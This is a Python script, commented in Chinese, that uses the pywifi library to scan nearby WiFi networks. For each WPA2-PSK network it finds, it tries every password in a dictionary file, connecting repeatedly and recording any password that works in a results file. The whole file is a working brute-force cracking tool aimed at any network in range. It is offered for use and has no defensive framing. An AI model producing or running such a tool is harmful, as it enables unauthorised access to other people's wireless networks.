# coding:utf-8
import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
from asyncio.tasks import sleep
# 需要第三方库 pywifi  (python3 pip install pywifi)
# 缺陷： wifi名编码为乱码时会导致崩溃
#       控制台报错：UnicodeEncodeError: 'gbk' codec can't encode character '\xe6' in position 0: illegal multibyte sequence
class PoJie():
    def __init__(self,pwdfile,resfiles): # 类初始化
        # self.file=open(path,"r",errors="ignore")
        self.resfiles= resfiles
        self.pwdfile = pwdfile
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无线网卡
        self.iface.disconnect() #测试链接断开所有链接
        time.sleep(1) #休眠1秒
        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
    def readPassWord(self,wifissid):  # 读取密码字典，进行匹配
            print("开始破解： %s"%wifissid)
            # 将结果写入文本文件记录
            res = "开始破解：: %s \n"%wifissid;
            open(self.resfiles,"a").write(res)
            pwdfilehander=open(self.pwdfile,"r",errors="ignore")
            while True:
                try:
                    myStr =pwdfilehander.readline()
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr,wifissid)
                    if bool1:
                        # print("密码正确："+myStr)
                        # res = "密码:%s 正确 \n"%myStr;
                        res = "===正确=== ^_^ wifi名:%s  匹配密码：%s "%(wifissid,myStr);
                        print(res)
                        # 将结果写入文本文件记录
                        open(self.resfiles,"a").write(res)
                        break
                    else:
                        # print("密码:"+myStr+"错误")
                        res = "---错误--- wifi名:%s匹配密码：%s"%(wifissid,myStr);
                        print(res)
                        # 将结果写入文本文件记录
                        open(self.resfiles,"a").write(res)
                    sleep(3)
                except:
                    continue
    def foreachPassWord(self):  # 读取密码字典，进行匹配
            print("开始扫描附近wifi...")
            wifi_list = self.scans_wifi_list()
            print("扫描完成! ^_^")
            for index,wifi_info in enumerate(wifi_list):
                self.readPassWord(wifi_info.ssid)
            print("执行完毕! ^_^")
    def scans_wifi_list(self):  # 扫描周围wifi列表
        #开始扫描
        self.iface.scan()
        time.sleep(15)
        #在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        #统计附近被发现的热点数量
        nums = len(scanres)
        # print("|SCAN GET %s"%(nums))
        print("|扫描数量: %s"%(nums))
        # 在控制台表格输出 扫描列表
        # return self.iface.scan_results()
        # 表格 标题行
        # print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
        print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres
    def show_scans_wifi_list(self,scans_res):  # 显示扫描周围wifi列表
        #开始扫描
        # self.scans_wifi_list()
        for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
    def test_connect(self,findStr,wifissid):#测试链接
        profile = pywifi.Profile()  #创建wifi链接文件
        #profile.ssid ="e2" #wifi名称
        # profile.ssid ="1104" #wifi名称
        # profile.ssid ="1601" #wifi名称
        profile.ssid =wifissid #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True   
        else:
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK
    def __del__(self):
        self.file.close()

# 类写完
# 开始执行
# 导入数据文件 绝对路径写法
# pwdfile=r"C:\Users\XieZhenBin\Desktop\wifi_passwd.txt" #密码字典路径
# resfiles=r"C:\Users\XieZhenBin\Desktop\pj_res.txt" #结果文件保存路径

# 导入数据文件相对路径写法
pwdfile=r"wifi_passwd.txt" #密码字典路径
resfiles=r"pj_res.txt" #结果文件保存路径

start=PoJie(pwdfile,resfiles) #实例化类

# outlist = start.scans_wifi_list()
# print(outlist)
# print(outlist[0].ssid)
# print(outlist[0].bssid)
# print(outlist[0].signal)
outlist = start.foreachPassWord()